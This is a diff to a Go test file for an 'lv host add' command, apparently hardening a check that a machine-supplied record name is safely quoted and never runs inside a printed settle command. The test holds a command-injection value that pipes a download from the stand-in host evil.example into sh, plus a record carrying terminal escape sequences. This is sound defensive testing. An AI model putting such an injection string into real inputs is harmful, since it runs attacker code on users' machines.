@@ -7,6 +7,7 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"testing"
 	"time"
@@ -275,10 +276,15 @@ func TestHostAdd_ARecentInstallIsJudgedByTheCertificateInstalled(t *testing.T) {
 
 // Our review I2: the name in another attempt's record is the machine's text,
 // and was printed inside the command the operator is told to run. A record
-// whose name is not a host name is not printed or used; nor are an install
-// record's fields that do not parse.
+// name that does not print safely (a control character, say) is not printed
+// or used; nor are an install record's fields that do not parse. A name that
+// prints safely is printed only as one quoted shell word of the settle
+// command, which sh splits into exactly that command and which runs nothing
+// else.
 //
-// Mutation: accept any record name — the refusal prints the injected text.
+// Mutations: accept any record name — the control-character record is
+// echoed; shellWord returns its input — the metacharacter name splits and
+// runs.
 func TestHostAdd_AMachinesTextNeverReachesAPrintedCommand(t *testing.T) {
 	const evil = "x;curl${IFS}evil.example|sh;#"
 	t.Run("an attempt record", func(t *testing.T) {
@@ -289,7 +295,35 @@ func TestHostAdd_AMachinesTextNeverReachesAPrintedCommand(t *testing.T) {
 			t.Fatal(err)
 		}
 		err := f.add(t)
-		if err == nil || strings.Contains(err.Error(), "curl") || strings.Contains(err.Error(), "lv host rm x") {
+		if err == nil {
+			t.Fatal("add over another attempt's record: nil")
+		}
+		m := regexp.MustCompile("`(lv host rm [^`]*)`").FindStringSubmatch(err.Error())
+		if m == nil {
+			t.Fatalf("add = %v, want the settle command", err)
+		}
+		dir := t.TempDir()
+		got := shellWords(t, dir, m[1])
+		want := []string{"lv", "host", "rm", evil, "--serial", "abc", "--address", "10.0.0.9"}
+		if strings.Join(got, "\x00") != strings.Join(want, "\x00") {
+			t.Errorf("%q splits as %q, want %q", m[1], got, want)
+		}
+		if ents, _ := os.ReadDir(dir); len(ents) != 0 {
+			t.Errorf("evaluating %q ran something: %v", m[1], ents)
+		}
+		if reachedInstall(f.target.Events) || len(f.client.admitted) != 0 {
+			t.Errorf("admitted %v, events %v", f.client.admitted, f.target.Events)
+		}
+	})
+	t.Run("an attempt record that does not print safely", func(t *testing.T) {
+		f := newAddFixture(t)
+		installPair(t, f, "", "foreign")
+		if err := os.WriteFile(filepath.Join(f.targetPKI, ".host.crt.add-abc-0123456789ab.before"),
+			[]byte("x\x1b[2Jcurl -\n"), 0o600); err != nil {
+			t.Fatal(err)
+		}
+		err := f.add(t)
+		if err == nil || strings.Contains(err.Error(), "curl") || strings.Contains(err.Error(), "lv host rm") {
 			t.Fatalf("add = %v, want a refusal that does not echo the record", err)
 		}
 		if reachedInstall(f.target.Events) || len(f.client.admitted) != 0 {
